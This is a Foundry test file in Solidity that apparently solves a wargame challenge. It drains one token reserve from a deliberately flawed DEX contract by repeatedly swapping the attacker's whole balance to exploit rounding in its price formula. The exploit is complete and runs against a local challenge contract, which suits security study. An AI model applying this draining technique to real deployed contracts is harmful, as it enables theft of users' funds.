// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {VmSafe} from "forge-std/Vm.sol";
import {Test, console} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/Level22.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

contract Level22Test is Test {
    Dex public target;
    address public token1;
    address public token2;

    VmSafe.Wallet attacker;

    function setUp() public {
        attacker = vm.createWallet("attacker");
        VmSafe.Wallet memory deployer = vm.createWallet("deployer");
        target = new Dex();
        token1 = address(new SwappableToken(address(target), "T1", "T1", 110));
        token2 = address(new SwappableToken(address(target), "T2", "T2", 110));
        IERC20(token1).transfer(attacker.addr, 10);
        IERC20(token2).transfer(attacker.addr, 10);

        IERC20(token1).approve(address(target), 100);
        IERC20(token2).approve(address(target), 100);
        target.addLiquidity(token1, 100);
        target.addLiquidity(token2, 100);
        target.setTokens(token1, token2);
    }

    function test_exploit() public {
        vm.startPrank(attacker.addr, attacker.addr);
        exploit(address(target), attacker.addr);
        vm.stopPrank();

        uint256 balance1 = IERC20(target.token1()).balanceOf(address(target));
        uint256 balance2 = IERC20(target.token2()).balanceOf(address(target));

        uint256 attackerBalance1 = IERC20(target.token1()).balanceOf(attacker.addr);
        uint256 attackerBalance2 = IERC20(target.token2()).balanceOf(attacker.addr);

        console.log("Token1 in Dex", balance1);
        console.log("Token2 in Dex", balance2);
        console.log("Token1 Attacker", attackerBalance1);
        console.log("Token2 Attacker", attackerBalance2);

        assertTrue(balance1 == 0 || balance2 == 0);
    }

    function exploit(address _target, address _attacker) private {
        Dex dex = Dex(_target);
        IERC20 t1 = IERC20(dex.token1());
        IERC20 t2 = IERC20(dex.token2());


        t1.approve(_target, type(uint256).max);
        t2.approve(_target, type(uint256).max);

        while(true) {
            if(t2.balanceOf(_attacker) >= t2.balanceOf(_target)) {
                dex.swap(address(t2), address(t1), t2.balanceOf(_target));
                return;
            }
            dex.swap(address(t2), address(t1), t2.balanceOf(_attacker));

            if(t1.balanceOf(_attacker) >= t1.balanceOf(_target)) {
                dex.swap(address(t1), address(t2), t1.balanceOf(_target));
                return;
            }
            dex.swap(address(t1), address(t2), t1.balanceOf(_attacker));
        }
    }
}
